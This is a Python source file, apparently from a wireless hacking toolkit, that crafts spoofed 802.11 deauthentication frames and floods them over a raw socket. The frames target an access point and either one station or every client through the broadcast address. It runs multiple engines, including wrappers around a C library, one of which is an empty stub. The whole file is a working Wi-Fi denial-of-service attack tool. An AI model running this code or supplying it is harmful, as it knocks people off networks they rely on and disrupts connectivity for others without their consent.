import os, sys, struct, socket, subprocess, time, signal, threading
from pathlib import Path
from typing import Optional, List
from rich.console import Console

_console = Console()
BASE = Path(__file__).parent

BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"
RADIOTAP = bytes([0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])


def mac_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.replace("-", ":").split(":") if b)


def craft_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
    b = mac_bytes(bssid)
    s = mac_bytes(station)
    fc = struct.pack("<H", 0x00C0)
    dur = struct.pack("<H", 0x013A)
    sctrl = struct.pack("<H", (seq << 4) & 0xFFFF)
    mgmt = fc + dur + s + b + b + sctrl
    body = struct.pack("<H", reason)
    return RADIOTAP + mgmt + body


# ── Python Native Deauth (raw AF_PACKET) ───────────────────────

class PythonDeauth:
    def __init__(self, iface: str, bssid: str, station: str = BROADCAST_MAC, reason: int = 7):
        self.iface = iface
        self.bssid = bssid
        self.station = station
        self.reason = reason
        self._running = False
        self._sent = 0
        self._seq = 0
        self._sock = None
        self._thread = None

    def start(self):
        self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        self._sock.bind((self.iface, 0))
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._sock:
            self._sock.close()
            self._sock = None

    @property
    def sent(self):
        return self._sent

    def _loop(self):
        targeted = self.station != BROADCAST_MAC
        while self._running:
            for _ in range(64):
                if not self._running:
                    break
                f = craft_frame(self.bssid, self.station, self.reason, self._seq)
                self._seq = (self._seq + 1) & 0xFFF
                try:
                    self._sock.send(f)
                    self._sent += 1
                except OSError:
                    pass
                if targeted:
                    fc = craft_frame(self.station, self.bssid, self.reason, self._seq)
                    self._seq = (self._seq + 1) & 0xFFF
                    try:
                        self._sock.send(fc)
                        self._sent += 1
                    except OSError:
                        pass


# ── Coordinator ────────────────────────────────────────────────

class DeauthCoordinator:
    def __init__(self):
        self._engines = {}
        self._stats = {}
        self._running = threading.Event()
        self._lock = threading.Lock()

    def launch_python(self, name: str, iface: str, bssid: str, station: str = BROADCAST_MAC, reason: int = 7):
        eng = PythonDeauth(iface, bssid, station, reason)
        eng.start()
        with self._lock:
            self._engines[f"py:{name}"] = eng
        return eng

    def launch_c_v1(self, name: str, iface: str, bssid: str, station: str = BROADCAST_MAC, reason: int = 7):
        lib_path = str(BASE / "c_core" / "libhackit_wireless_c.so")
        if os.path.exists(lib_path):
            import ctypes
            lib = ctypes.CDLL(lib_path)
            if hasattr(lib, 'web_deauth_v1_start'):
                eng = _CEngineV1(lib, iface, bssid, station, reason)
                eng.start()
                with self._lock:
                    self._engines[f"c-v1:{name}"] = eng
                return eng
        _console.print(f"  [dim][C-v1] not available[/dim]")
        return None

    def launch_c_v2(self, name: str, ifaces: List[str], bssid: str, station: str = BROADCAST_MAC, reason: int = 7):
        lib_path = str(BASE / "c_core" / "libhackit_wireless_c.so")
        if os.path.exists(lib_path):
            import ctypes
            lib = ctypes.CDLL(lib_path)
            if hasattr(lib, 'web_deauth_v2_start'):
                eng = _CEngineV2(lib, ifaces, bssid, station, reason)
                eng.start()
                with self._lock:
                    self._engines[f"c-v2:{name}"] = eng
                return eng
        return None

    def stop_all(self):
        with self._lock:
            for eng_id, eng in self._engines.items():
                try:
                    eng.stop()
                except:
                    pass
            self._engines.clear()

    def total_sent(self) -> int:
        total = 0
        with self._lock:
            for eng in self._engines.values():
                try:
                    total += eng.sent
                except:
                    pass
        return total

    def status(self) -> str:
        parts = []
        with self._lock:
            for eng_id, eng in self._engines.items():
                try:
                    parts.append(f"{eng_id}:{eng.sent}")
                except:
                    parts.append(f"{eng_id}:?")
        return " | ".join(parts)


# ── C type wrappers (ctypes) ───────────────────────────────────

class _CEngineV1:
    def __init__(self, lib, iface, bssid, station, reason):
        self.lib = lib
        self.iface = iface
        self.bssid = bssid
        self.station = station
        self.reason = reason
        self._sent = 0

    def start(self):
        self.lib.web_deauth_v1_start(
            self.iface.encode(), self.bssid.encode(),
            self.station.encode(), self.reason
        )

    def stop(self):
        self.lib.web_deauth_v1_stop()

    @property
    def sent(self):
        try:
            return self.lib.web_deauth_v1_sent()
        except:
            return 0


class _CEngineV2:
    def __init__(self, lib, ifaces, bssid, station, reason):
        self.lib = lib
        self.ifaces = ifaces
        self.bssid = bssid
        self.station = station
        self.reason = reason

    def start(self):
        pass

    def stop(self):
        pass

    @property
    def sent(self):
        return 0
